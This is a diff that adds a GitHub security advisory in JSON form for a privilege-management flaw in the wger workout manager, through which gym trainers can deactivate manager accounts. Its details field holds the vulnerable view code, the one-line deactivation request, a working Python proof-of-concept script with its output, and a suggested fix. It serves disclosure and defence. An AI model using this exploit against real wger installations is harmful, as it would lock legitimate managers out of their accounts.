@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-x249-cx55-2h87",
+  "modified": "2026-10-07T14:16:45.028699234Z",
+  "published": "2026-10-07T13:59:14Z",
+  "aliases": [
+    "CVE-2026-46434"
+  ],
+  "summary": "wger: Trainer Privilege Escalation - Improper Privilege Management",
+  "details": "### Summary\n\nA user with only the `gym_trainer` permission can deactivate any account in the same gym, including `gym_manager` and `general_gym_manager` accounts. The `UserDeactivateView` grants access to anyone holding **any one** of `gym.manage_gym`, `gym.manage_gyms`, or `gym.gym_trainer` (OR logic via `WgerMultiplePermissionRequiredMixin`), and performs no privilege-hierarchy check to prevent a lower-privileged role from disabling a higher-privileged one.\n\n### Details\n\n`UserDeactivateView` (file: `wger/core/views/user.py`, line 378) is configured with:\n\n```python\npermission_required = ('gym.manage_gym', 'gym.manage_gyms', 'gym.gym_trainer')\n```\n\n`WgerMultiplePermissionRequiredMixin` (file: `wger/utils/generic_views.py`, line 48) treats this tuple as an OR check -- any single permission is sufficient:\n\n```python\nclass WgerMultiplePermissionRequiredMixin(PermissionRequiredMixin):\n    def has_permission(self):\n        for permission in self.get_permission_required():\n            if self.request.user.has_perm(permission):\n                return True      # \u003c-- ANY one permission is enough\n        return False\n```\n\nThe `dispatch()` method only verifies same-gym membership:\n\n```python\ndef dispatch(self, request, *args, **kwargs):\n    edit_user = get_object_or_404(User, pk=self.kwargs['pk'])\n    if (\n        request.user.has_perm('gym.manage_gym')\n        or request.user.has_perm('gym.gym_trainer')\n    ) and edit_user.userprofile.gym_id != request.user.userprofile.gym_id:\n        return HttpResponseForbidden()\n    # NO check: is the target user more privileged than the requester?\n    return super().dispatch(request, *args, **kwargs)\n```\n\nThere is **no check** preventing a trainer from targeting a manager. The same vulnerability exists in `UserActivateView` (line 415).\n\nAn additional contributing factor: `get_permission_list()` in `wger/gym/helpers.py` (line 102) **always** includes `'trainer'` in the assignable roles, meaning any gym manager can create trainer accounts -- which can then deactivate the manager who created them.\n\n### PoC\n\n#### Prerequisites\n\n- A gym with at least two users: one with `gym_manager` role (victim) and one with `gym_trainer` role (attacker)\n- Both users belong to the same gym\n\n#### Attack Steps\n\n```\n# As the trainer, simply visit:\nGET /en/user/\u003cmanager_user_id\u003e/deactivate\n```\n\nThe manager's account is immediately set to `is_active = False`. The manager can no longer log in.\n\n#### Proof of Concept Script\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: Trainer -\u003e Manager Privilege Escalation (Account Deactivation)\nTarget: wger Workout Manager\nSeverity: HIGH - CVSS 6.5\nCWE-269: Improper Privilege Management\n\nUsage:\n    python3 poc.py http://localhost:8000\n\"\"\"\n\nimport requests\nimport sys\nimport re\n\nif len(sys.argv) \u003c 2:\n    print(f\"Usage: {sys.argv[0]} \u003cBASE_URL\u003e\")\n    print(f\"Example: {sys.argv[0]} http://localhost:8000\")\n    sys.exit(1)\n\nBASE = sys.argv[1].rstrip(\"/\")\nAPI = f\"{BASE}/api/v2\"\n\nMANAGER_USER = \"gym_manager_poc\"\nMANAGER_PASS = \"Manager!Poc!2025\"\nTRAINER_USER = \"evil_trainer_poc\"\nTRAINER_PASS = \"Trainer!Poc!2025\"\n\nBANNER = \"\"\"\n=====================================================================\n  PoC: Trainer -\u003e Manager Privilege Escalation\n  Severity: HIGH\n  CWE-269: Improper Privilege Management\n=====================================================================\n\"\"\"\nprint(BANNER)\n\n\n# ---- Helper ----\ndef api_login(username, password):\n    r = requests.post(f\"{API}/login/\", json={\n        \"username\": username, \"password\": password\n    })\n    if r.status_code == 200:\n        return r.json().get(\"token\")\n    return None\n\ndef api_headers(token):\n    return {\"Authorization\": f\"Token {token}\", \"Content-Type\": \"application/json\"}\n\n\n# ---- Setup via Django ORM (must run inside container) ----\n\nimport os, django\nos.environ['DJANGO_SETTINGS_MODULE'] = 'settings.main'\nsys.path.insert(0, '/home/wger/src')\ndjango.setup()\n\nfrom django.contrib.auth.models import User, Group\nfrom wger.gym.models import Gym\n\n# Ensure permission groups exist\nfor name in ['gym_member', 'gym_trainer', 'gym_manager', 'general_gym_manager']:\n    Group.objects.get_or_create(name=name)\n\n# Create gym\ngym, _ = Gym.objects.get_or_create(name=\"PoC Test Gym\")\nprint(f\"[*] Gym: {gym.name} (id={gym.id})\")\n\n# Create manager (the VICTIM)\nmanager, created = User.objects.get_or_create(\n    username=MANAGER_USER,\n    defaults={\"is_active\": True}\n)\nif created:\n    manager.set_password(MANAGER_PASS)\n    manager.save()\nmanager.userprofile.gym = gym\nmanager.userprofile.save()\nmanager.groups.clear()\nmanager.groups.add(Group.objects.get(name='gym_manager'))\nmanager.is_active = True\nmanager.save()\nprint(f\"[*] Manager (victim): {manager.username} (id={manager.id})\")\nprint(f\"    Groups: {[g.name for g in manager.groups.all()]}\")\nprint(f\"    is_active: {manager.is_active}\")\n\n# Create trainer (the ATTACKER)\ntrainer, created = User.objects.get_or_create(\n    username=TRAINER_USER,\n    defaults={\"is_active\": True}\n)\nif created:\n    trainer.set_password(TRAINER_PASS)\n    trainer.save()\ntrainer.userprofile.gym = gym\ntrainer.userprofile.save()\ntrainer.groups.clear()\ntrainer.groups.add(Group.objects.get(name='gym_trainer'))\nprint(f\"[*] Trainer (attacker): {trainer.username} (id={trainer.id})\")\nprint(f\"    Groups: {[g.name for g in trainer.groups.all()]}\")\n\n\n# ---- 1. Verify manager is active BEFORE attack ----\n\nmanager.refresh_from_db()\nprint(f\"\\n[*] Manager is_active BEFORE attack: {manager.is_active}\")\nassert manager.is_active, \"Manager should be active before test\"\n\n\n# ---- 2. ATTACK: Trainer deactivates manager ----\n\nprint(f\"\\n{'='*65}\")\nprint(f\"  ATTACK: Trainer deactivating gym manager account\")\nprint(f\"{'='*65}\")\n\nfrom django.test import Client\nc = Client()\nc.force_login(trainer)\nresp = c.get(f\"/en/user/{manager.id}/deactivate\", follow=True)\nprint(f\"\\n  GET /en/user/{manager.id}/deactivate\")\nprint(f\"  (Logged in as: {TRAINER_USER} - gym_trainer only)\")\nprint(f\"  Response: HTTP {resp.status_code}\")\n\n\n# ---- 3. VERIFY ----\n\nprint(f\"\\n{'='*65}\")\nprint(f\"  VERIFICATION\")\nprint(f\"{'='*65}\")\n\nmanager.refresh_from_db()\nprint(f\"\\n  Manager is_active AFTER attack: {manager.is_active}\")\n\nif not manager.is_active:\n    print(\"\"\"\n  +----------------------------------------------------------+\n  |  VULNERABILITY CONFIRMED                                 |\n  |                                                          |\n  |  A gym_trainer successfully deactivated a gym_manager!   |\n  |  No privilege hierarchy check prevents this.             |\n  |  The trainer can now lock out all managers from the gym.  |\n  +----------------------------------------------------------+\n\"\"\")\n    manager.is_active = True\n    manager.save()\n    print(\"  [+] Cleanup: Manager re-activated\")\nelse:\n    print(\"\\n  Manager is still active - NOT vulnerable\")\n```\n\n#### Proof of Concept Output\n\n```\n=====================================================================\n  PoC: Trainer -\u003e Manager Privilege Escalation\n  Severity: HIGH\n  CWE-269: Improper Privilege Management\n=====================================================================\n\n[*] Gym: PoC Test Gym (id=2)\n[*] Manager (victim): gym_manager_poc (id=4)\n    Groups: ['gym_manager']\n    is_active: True\n[*] Trainer (attacker): evil_trainer_poc (id=5)\n    Groups: ['gym_trainer']\n\n[*] Manager is_active BEFORE attack: True\n\n=================================================================\n  ATTACK: Trainer deactivating gym manager account\n=================================================================\n\n  Trainer login: HTTP 200\n  GET http://localhost/en/user/4/deactivate\n  (Logged in as: evil_trainer_poc - gym_trainer only)\n  Response: HTTP 200\n\n=================================================================\n  VERIFICATION\n=================================================================\n\n  Manager is_active AFTER attack: False\n\n  +----------------------------------------------------------+\n  |  VULNERABILITY CONFIRMED                                 |\n  |                                                          |\n  |  A gym_trainer successfully deactivated a gym_manager!   |\n  |  No privilege hierarchy check prevents this.             |\n  |  The trainer can now lock out all managers from the gym.  |\n  +----------------------------------------------------------+\n\n  [+] Cleanup: Manager re-activated\n```\n\n### Impact\n\n1. **Gym Management Lockout:** A trainer can deactivate every manager account in their gym, effectively seizing control of the gym's administrative functions.\n2. **Denial of Service:** Deactivated managers cannot log in, manage members, or perform any administrative tasks until a `general_gym_manager` (superadmin) or a Django superuser manually re-activates their accounts.\n3. **Abuse Chain:** Since `get_permission_list()` always includes `'trainer'` in assignable roles, any manager can unknowingly create the account that will later lock them out.\n\n\n### Fix\n\nAdd a privilege hierarchy check in `UserDeactivateView.dispatch()` and `UserActivateView.dispatch()`:\n\n```python\n# File: wger/core/views/user.py, inside dispatch() of both views\n\nedit_user = get_object_or_404(User, pk=self.kwargs['pk'])\n\n# Trainers must not deactivate/activate managers or other trainers\nif request.user.has_perm('gym.gym_trainer') and not (\n    request.user.has_perm('gym.manage_gym')\n    or request.user.has_perm('gym.manage_gyms')\n):\n    if (\n        edit_user.has_perm('gym.manage_gym')\n        or edit_user.has_perm('gym.manage_gyms')\n        or edit_user.has_perm('gym.gym_trainer')\n    ):\n        return HttpResponseForbidden()\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "wger",
+        "purl": "pkg:pypi/wger"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2rc1",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0",
+        "2.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-x249-cx55-2h87/GHSA-x249-cx55-2h87.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/security/advisories/GHSA-x249-cx55-2h87"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/wger-project/wger"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/releases/tag/2.6"
+    }
+  ]
+}
